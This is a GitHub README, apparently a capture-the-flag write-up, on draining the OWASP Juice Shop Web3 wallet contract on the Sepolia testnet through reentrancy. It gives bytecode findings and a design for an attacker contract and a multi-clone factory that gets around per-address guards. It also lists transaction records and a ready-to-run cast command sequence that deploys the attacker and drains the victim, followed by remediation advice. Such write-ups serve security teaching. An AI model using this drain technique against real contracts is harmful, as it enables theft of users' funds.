# Juice Shop Wallet Depletion

Reentrancy exploit against the [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) Web3 wallet challenge on the Ethereum Sepolia testnet.

### Contributor
- [0x11semprez](https://github.com/0x11semprez)

---

## Table of Contents
1. [Methodology](#1-methodology)
2. [Exploit Design (v1 — Original)](#2-exploit-design-v1--original)
3. [Exploit Design (v2 — Improved)](#3-exploit-design-v2--improved)
4. [On-Chain Execution](#4-on-chain-execution)
5. [Business Impact](#5-business-impact)
6. [Remediation](#6-remediation)
7. [Evidence & Aftermath](#7-evidence--aftermath)
8. [Project Structure & Usage](#8-project-structure--usage)

---

## 1) Methodology

1. **Recon / enumeration**
   - Figured out our point of entry would be the new web 3 wallet accessible from ![Wallet](/WD/WD-0.png) ![1](/WD/WD-1.png)
   - **Target :** Juice Shop Sepolia testnet smart contract (victim) found in the source code : `0x413744D59d31AFDC2889aeE602636177805Bd7b0`.

2. **Bytecode analysis**
   - Decompiled the victim's on-chain bytecode to extract function selectors.
   - Discovered the deposit function is **`ethdeposit(address)`** (selector `0x22c33cb3`), not the standard `deposit(address)` (`0xf340fa01`).
   - Withdraw function is the standard **`withdraw(uint256)`** (selector `0x2e1a7d4d`).

---

### Vulnerable Code Flow
```solidity
function withdraw(uint256 _amount) {
    // 1. Check (balance sufficient)
    require(balances[caller] >= _amount);

    // 2. Fake "guard" (incremented but reset later)
    unknownac7ea680[caller]++;

    // 3. INTERACTION (external call BEFORE state update)
    call.value(_amount)(caller);

    // 4. EFFECT (state update happens LAST)
    balances[caller] -= _amount;

    // 5. Guard reset (too late)
    unknownac7ea680[caller] = 0;
}
```

**Vulnerability:** The victim violates the **Checks-Effects-Interactions** pattern. It sends ETH via an external call (step 3) **before** updating the caller's balance (step 4). The reentrancy guard (`unknownac7ea680`) is useless because it increments before the call but resets after — during reentry, the function never reaches the reset line.

**Severity:** Critical — possible drain of all funds held by the contract.

---

## 2) Exploit Design (v1 — Original)

[Wrote and deployed a contract on the Sepolia ETH testnet to exploit a reentrancy vulnerability within the juice shop contract.](https://github.com/Keuchnotkush/Juice-Shop-Wallet-Depletion/blob/main/attack.sol)

#### How It Works

1. **Deposit ETH** — Calls the victim's `ethdeposit` function to establish a balance for the attack.
2. **Trigger Withdrawal** — Calls the victim's `withdraw` function to start the exploit.
3. **Re-enter Withdrawal** — The `fallback` function is triggered during the victim's ETH transfer. It recursively calls `withdraw` before the victim updates the balance, draining funds.
4. **Withdraw Stolen ETH** — Sends the stolen ETH to the attacker's wallet.

#### v1 Execution
- Deposited `0.1 ETH` into the victim.
- Triggered `exploit(1000000000000000000 WEI)` and re-entered 13 times to drain `2.5 ETH`.
- Verified on Sepolia block explorer. Challenge endpoint responded `200 OK`.

#### v1 Tools
- **Remix IDE** (compile/deploy/call contracts)
- **Phantom** (Web3 wallet & signing)
- **Sepolia testnet faucet** (funding)
- **Etherscan (Sepolia)** (transaction & contract inspection)
- **Browser DevTools** (platform API observation)

#### v1 Outcome
| Metric | Value |
|--------|-------|
| Initial deposit | `0.1 ETH` |
| Total withdrawn | `2.6 ETH` |
| Net gain | `2.5 ETH` (**2400%** ROI) |

---

## 3) Exploit Design (v2 — Improved)

The original `attack.sol` was rewritten from scratch with bug fixes, a typed interface, event-based forensics, a Foundry test suite, and an extended multi-contract attack vector.

### Bugs Fixed from v1

| # | Issue | v1 | v2 |
|---|-------|-----|-----|
| 1 | Reentry depth | `attackCount < 2` — only 1 reentry | Balance-based + gas-guarded termination — drains until victim is empty |
| 2 | Amount mismatch | `fallback()` hardcoded `0.1 ether`, `exploit(amount)` used a different value | `withdrawAmount` stored in state, used by both `exploit()` and `_reenter()` |
| 3 | ETH forwarding | `transfer()` with 2300 gas stipend | `.call{value:}("")` — no gas limit |
| 4 | Raw selectors | Magic numbers `0x2e1a7d4d`, `0x22c33cb3` | `IVictim` interface with typed calls |
| 5 | Wrong function name | Used `deposit(address)` — wrong selector | Corrected to `ethdeposit(address)` after bytecode analysis |
| 6 | No observability | Silent execution | Events: `Deposited`, `ExploitStarted`, `Reentry`, `ExploitCompleted`, `Withdrawn` |
| 7 | Hardcoded victim | No reconfiguration after deployment | `setVictim()` with owner guard |
| 8 | `receive()` vs `fallback()` | Only `fallback()` — missed empty-calldata ETH transfers | Both `receive()` and `fallback()` route to `_reenter()` |

### v2 Attack Flow

```
depositToVictim()          exploit(amount)                     withdraw()
      │                         │                                  │
      ▼                         ▼                                  ▼
 ┌─────────┐             ┌─────────────┐                    ┌───────────┐
 │ ethdeposit│            │  withdraw() │◄──┐               │ Send ETH  │
 │ into      │            │  on victim  │   │               │ to owner  │
 │ victim    │            └──────┬──────┘   │               │ EOA       │
 └──────────┘                    │          │               └───────────┘
                          victim sends ETH  │
                                 │          │
                          ┌──────▼──────┐   │
                          │ _reenter()  │   │  balance-based
                          │ checks:     │   │  recursion
                          │ balance >= ? ├───┘
                          │ gas > 50k?  │
                          └─────────────┘
```

### Extended Exploit: Multi-Contract Relay (`AttackerFactory`)

The `AttackerFactory` defeats **per-address reentrancy guards** by deploying multiple `Attacker` clones. Each clone is a unique `msg.sender` from the victim's perspective, so the guard mapping (`unknownac7ea680[caller]`) tracks them separately.

```
AttackerFactory
      │
      ├── deployClones(5)
      │     ├── Attacker #0  (unique msg.sender)
      │     ├── Attacker #1
      │     ├── Attacker #2
      │     ├── Attacker #3
      │     └── Attacker #4
      │
      ├── fundAndExploit(0.1 ether)  ──▶  each clone deposits + drains
      │
      ├── collectAll()               ──▶  pull ETH from all clones
      │
      └── withdraw()                 ──▶  send to owner EOA
```

### Test Results (14/14 passing)

```
forge test -vv

Ran 14 tests for test/Attacker.t.sol
├── AttackerTest
│   ├── [PASS] test_fullDrain          — 0.1 ETH deposit drains 2.6 ETH (26 reentries)
│   ├── [PASS] test_partialDrain       — partial drain with remainder
│   ├── [PASS] test_depositAndExploit  — single-tx convenience function
│   ├── [PASS] test_withdrawToOwner    — stolen ETH reaches owner
│   ├── [PASS] test_exploitEmptyVictim — edge case: no extra funds to drain
│   ├── [PASS] test_onlyOwner_exploit  — access control
│   ├── [PASS] test_onlyOwner_withdraw — access control
│   ├── [PASS] test_onlyOwner_deposit  — access control
│   ├── [PASS] test_setVictim          — reconfiguration
│   ├── [PASS] test_setVictim_rejectsZero
│   └── [PASS] test_eventEmission      — forensic events
│
└── AttackerFactoryTest
    ├── [PASS] test_deployClones       — factory deploys n clones
    ├── [PASS] test_multiCloneDrain    — 5 clones drain 5.5 ETH total
    └── [PASS] test_onlyOwner_factory  — access control

14 tests passed, 0 failed
```

---

## 4) On-Chain Execution

### v1 — Original exploit (Remix IDE)

| | Address |
|---|---|
| Attacker (v1) | [`0x1F0db224880Dcd7dAc8fedB0fb01Be9041bF7929`](https://sepolia.etherscan.io/address/0x1F0db224880Dcd7dAc8fedB0fb01Be9041bF7929) |
| Victim | [`0x413744D59d31AFDC2889aeE602636177805Bd7b0`](https://sepolia.etherscan.io/address/0x413744D59d31AFDC2889aeE602636177805Bd7b0) |

| Metric | Value |
|--------|-------|
| Deposit | 0.1 ETH |
| Drained | 2.6 ETH |
| Net gain | 2.5 ETH (2400% ROI) |

### v2 — Improved exploit (Foundry + cast)

| | Address |
|---|---|
| Attacker (v2) | [`0x44642a44Ab72E91eFc9c829a19c4bB0C9b63e44c`](https://sepolia.etherscan.io/address/0x44642a44Ab72E91eFc9c829a19c4bB0C9b63e44c) |
| Victim | [`0x413744D59d31AFDC2889aeE602636177805Bd7b0`](https://sepolia.etherscan.io/address/0x413744D59d31AFDC2889aeE602636177805Bd7b0) |

**Key transactions:**

| Step | Tx Hash | Description |
|------|---------|-------------|
| Deploy | [`0xf5a3e342...`](https://sepolia.etherscan.io/tx/0xf5a3e3423f6f0ffe7ba27c74d46903d3b5a2bc47e2ca7023727f6d1fa9d9e156) | Deploy v2 Attacker contract |
| Deposit | [`0xecf57c49...`](https://sepolia.etherscan.io/tx/0xecf57c49002904dca29290a933c26fd68f6d3e6c9c0fcf6d380b000000f89fd4) | Deposit 0.1 ETH into victim |
| Exploit (1st) | [`0x73b05f3e...`](https://sepolia.etherscan.io/tx/0x73b05f3e31f5f12077d223824dedeaa4ff0b6df8b47a66a9e31f5a5caf302f36) | First reentrant drain (0.2 ETH) |
| Withdraw | [`0xe9558feb...`](https://sepolia.etherscan.io/tx/0xe9558feb74a8997be494daccec4ab3c967da9e08fa32e620e61800ce909714eb) | Withdraw 6.4 ETH to wallet |

**Execution details:**

The v2 exploit drained the victim across **~30 sequential transactions**, each performing **2 reentries** (0.2 ETH per tx). The victim's on-chain gas forwarding behavior limits recursion depth to ~2 levels per call, unlike the local MockVictim which allows full-depth drain in a single tx.

| Metric | Value |
|--------|-------|
| Deposit | 0.1 ETH |
| Exploit transactions | ~30 |
| Reentries per tx | 2 |
| Total drained | **6.4 ETH** |
| Gas spent | ~0.104 ETH |
| **Net gain** | **~6.3 ETH** |
| Victim remaining | 0.00026 ETH (dust, below 0.1 ETH threshold) |

### Final Balances

| | Before | After |
|---|--------|-------|
| Victim contract | 6.3 ETH | 0.00026 ETH |
| Attacker wallet | 0.998 ETH | **7.294 ETH** |

---

## 5) Business Impact

- **Permanent financial loss:** immediate theft of wallet/treasury funds (can drain contract balance quickly).
- **Service disruption:** contract becomes insolvent; legitimate users can't withdraw.
- **Reputation & trust damage:** public exploit harms long-term credibility and user retention.
- **Compliance / legal exposure:** potential reporting obligations and disputes if real funds are affected.

---

## 6) Remediation

### Fixes
- Apply **Checks-Effects-Interactions**: update balances **before** any external call.
- Add a **reentrancy guard** (OpenZeppelin `ReentrancyGuard` pattern).
- Prefer **pull-payments** pattern (users withdraw from their own balance; avoid complex external calls in the same function).

### Best Practices
- Unit/integration tests covering reentrancy cases (including adversarial tests).
- Automated static analysis & security scanning in CI (e.g., Slither-style checks).
- External code review / audit for contracts that hold value.
- Monitoring & incident response playbook (alerts on abnormal withdrawals).

---


### Techniques Used
- Smart-contract recon & bytecode/decompiler review
- Function selector extraction (`ethdeposit(address)` = `0x22c33cb3`)
- Reentrancy exploitation (recursive external calls via receive/fallback)
- Transaction verification & on-chain forensics (balances, blocks, tx hash, event logs)
- Iterative multi-transaction drain strategy

### Tools Used

| Tool | Purpose |
|------|---------|
| **Foundry** (forge, cast) | Compile, test, deploy, and interact with contracts |
| **Remix IDE** | v1 compilation and deployment |
| **Phantom** | Web3 wallet & transaction signing |
| **Sepolia testnet faucet** | Funding |
| **Etherscan (Sepolia)** | Transaction & contract inspection |
| **Browser DevTools** | Platform API observation |

---

## 8) Project Structure & Usage

```
├── src/
│   ├── Attacker.sol              # v2 reentrancy exploit contract
│   ├── AttackerFactory.sol       # Multi-clone attack (defeats per-address guards)
│   └── interfaces/
│       └── IVictim.sol           # Typed interface (ethdeposit + withdraw)
│
├── test/
│   ├── Attacker.t.sol            # 14 Foundry tests
│   └── mocks/
│       └── MockVictim.sol        # Local replica of the vulnerable contract
│
├── script/
│   ├── Deploy.s.sol              # Deploy Attacker to Sepolia
│   └── Exploit.s.sol             # Full attack sequence: deposit → exploit → withdraw
│
├── WD/                           # Evidence screenshots (WD-0 through WD-7)
├── attack.sol                    # Original v1 exploit (preserved for reference)
├── foundry.toml                  # Foundry configuration
└── .env.example                  # RPC & key template
```

### Quick Start

```bash
# Install Foundry
curl -L https://foundry.paradigm.xyz | bash && foundryup

# Build
forge build

# Run tests locally (no network needed)
forge test -vvvv

# Deploy to Sepolia
cp .env.example .env   # fill in SEPOLIA_RPC_URL and PRIVATE_KEY
source .env
VICTIM=0x413744D59d31AFDC2889aeE602636177805Bd7b0
cast send --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY \
  --create "$(forge inspect src/Attacker.sol:Attacker bytecode)$(cast abi-encode 'constructor(address)' $VICTIM | cut -c3-)"

# Deposit into victim
cast send --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY \
  --value 0.1ether $ATTACKER "depositToVictim()"

# Exploit (repeat until victim is drained)
cast send --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY \
  --gas-limit 5000000 $ATTACKER "exploit(uint256)" 100000000000000000

# Withdraw to your wallet
cast send --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY \
  $ATTACKER "withdraw()"
```

---

**License:** MIT
